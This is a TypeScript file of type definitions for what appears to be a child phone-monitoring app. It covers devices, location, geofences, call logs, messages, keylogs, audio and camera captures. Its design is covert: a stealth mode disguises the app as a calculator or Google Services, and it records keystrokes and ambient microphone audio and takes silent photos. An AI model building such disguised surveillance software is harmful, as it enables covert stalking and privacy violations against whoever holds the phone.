export interface Device {
  id: string;
  name: string;
  childName: string;
  model: string;
  androidVersion: string;
  batteryLevel: number;
  isCharging: boolean;
  networkType: '5G' | '4G' | 'Wi-Fi' | 'Offline';
  wifiSsid?: string;
  isOnline: boolean;
  isStealthActive: boolean;
  stealthDisguise: 'hidden' | 'calculator' | 'google_services' | 'notes_app';
  isDeviceLocked: boolean;
  lockMessage?: string;
  screenTimeTodayMinutes: number;
  lastPing: string;
  storageUsage: { usedGb: number; totalGb: number };
  ramUsage: { usedMb: number; totalMb: number };
  currentLocation: LocationPoint;
  avatarColor: string;
}

export type NavTab = 
  | 'dashboard'
  | 'overview'
  | 'surveillance'
  | 'tracking'
  | 'calls'
  | 'messages'
  | 'apps'
  | 'keylogger'
  | 'security'
  | 'install'
  | 'install_guide';

export interface LocationPoint {
  latitude: number;
  longitude: number;
  address: string;
  placeName: string;
  accuracyMeters: number;
  speedKmh: number;
  timestamp: string;
  batteryAtTime: number;
}

export interface GeofenceZone {
  id: string;
  name: string;
  type: 'safe' | 'restricted' | 'custom';
  latitude: number;
  longitude: number;
  radiusMeters: number;
  alertOnEntry: boolean;
  alertOnExit: boolean;
  color: string;
}

export interface CallLog {
  id: string;
  deviceId: string;
  contactName: string;
  phoneNumber: string;
  type: 'incoming' | 'outgoing' | 'missed' | 'rejected';
  timestamp: string;
  durationSeconds: number;
  hasRecording: boolean;
  recordingUrl?: string;
  isBlocked: boolean;
}

export interface SMSMessage {
  id: string;
  deviceId: string;
  app: 'sms' | 'whatsapp' | 'telegram' | 'instagram';
  sender: string;
  senderNumber: string;
  recipient: string;
  content: string;
  timestamp: string;
  isIncoming: boolean;
  hasThreatKeyword: boolean;
  threatCategory?: 'bullying' | 'restricted_meeting' | 'inappropriate' | 'financial';
}

export interface AppUsageItem {
  id: string;
  deviceId: string;
  appName: string;
  packageName: string;
  category: 'social' | 'games' | 'education' | 'entertainment' | 'productivity' | 'system';
  usedMinutesToday: number;
  dailyLimitMinutes?: number;
  isBlocked: boolean;
  iconColor: string;
  lastOpened: string;
  iconName: string;
}

export interface NotificationItem {
  id: string;
  deviceId: string;
  appName: string;
  title: string;
  body: string;
  timestamp: string;
  isThreat: boolean;
}

export interface KeylogItem {
  id: string;
  deviceId: string;
  appName: string;
  keystrokes: string;
  timestamp: string;
  isFlagged: boolean;
}

export interface AudioRecording {
  id: string;
  deviceId: string;
  title: string;
  source: 'surrounding_mic' | 'call_recorder' | 'voip_listener';
  durationSeconds: number;
  timestamp: string;
  fileSizeBytes: number;
  quality: 'HD (128kbps)' | 'Standard (64kbps)';
  isEncrypted: boolean;
}

export interface ActivityLog {
  id: string;
  deviceId: string;
  title: string;
  description: string;
  type: 'call' | 'sms' | 'geofence' | 'app_block' | 'surveillance' | 'security' | 'lockdown';
  severity: 'info' | 'warning' | 'critical' | 'success';
  timestamp: string;
}

export interface PhotoCapture {
  id: string;
  deviceId: string;
  camera: 'front' | 'rear';
  timestamp: string;
  imageUrl: string;
  trigger: 'manual_admin' | 'tamper_attempt' | 'scheduled' | 'unlock_failed';
}
